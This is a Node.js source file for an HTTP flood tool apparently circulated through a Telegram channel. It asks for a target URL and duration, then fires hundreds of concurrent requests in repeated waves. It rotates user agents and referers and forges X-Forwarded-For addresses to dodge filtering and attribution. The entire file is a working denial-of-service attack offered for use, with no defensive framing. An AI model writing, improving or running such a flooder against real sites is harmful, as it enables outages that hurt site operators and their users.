const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');

const MAX_CONCURRENT = Math.min(os.cpus().length * 75, 600);
const REQUEST_TIMEOUT = 8000;

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

// Pre-generate shuffled User-Agent pool
const UA_POOL = Array.from({ length: 10000 }, () =>
    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.uaIndex = 0;
    }

    getRandomUA() {
        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
        return UA_POOL[this.uaIndex];
    }

    getRandomReferer() {
        return REFERERS.length > 0
            ? REFERERS[Math.floor(Math.random() * REFERERS.length)]
            : 'https://google.com';
    }

    async makeRequest() {
        const headers = {
            'User-Agent': this.getRandomUA(),
            'Referer': this.getRandomReferer(),
            'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.')
        };

        try {
            const isHttps = this.target.startsWith('https');
            const response = await axios.get(this.target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent: keepAliveHttp,
                httpsAgent: keepAliveHttps
            });
            return response.status === 200 ? 'SUCCESS' : 'ERROR';
        } catch {
            return 'ERROR';
        }
    }

    async runAttack() {
        const fancyStart = () => {
            console.clear();
            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
            console.log('  ============================================');
            console.log(`  TARGET: ${this.target}`);
            console.log(`  TIME:   ${this.duration / 1000}s`);
            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
            console.log('  ============================================\n');
        };

        fancyStart();

        const rpsInterval = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const rps = this.stats.total / elapsed;
            this.stats.peakRps = Math.max(this.stats.peakRps, rps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${rps.toFixed(1)} `
            );
        }, 1000);

        // Custom concurrency manager (without p-limit)
        const executeConcurrently = async (tasks) => {
            const results = [];
            const executing = [];
            for (const task of tasks) {
                const promise = task().then(result => results.push(result)).catch(() => {});
                executing.push(promise);
                if (executing.length >= MAX_CONCURRENT) {
                    await Promise.race(executing);
                    executing.filter(p => p !== promise);
                }
            }
            await Promise.all(executing);
            return results;
        };

        while (Date.now() - this.startTime < this.duration) {
            const tasks = Array.from({ length: MAX_CONCURRENT }, () =>
                () => this.makeRequest()
            );

            const results = await executeConcurrently(tasks);

            for (const res of results) {
                this.stats.total++;
                if (res === 'SUCCESS') {
                    this.stats.success++;
                } else {
                    this.stats.errors++;
                }
            }

            await new Promise(r => setTimeout(r, 100)); // Sleep for a bit to avoid hitting max connection limits
        }

        clearInterval(rpsInterval);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

// Main
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME (seconds): ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
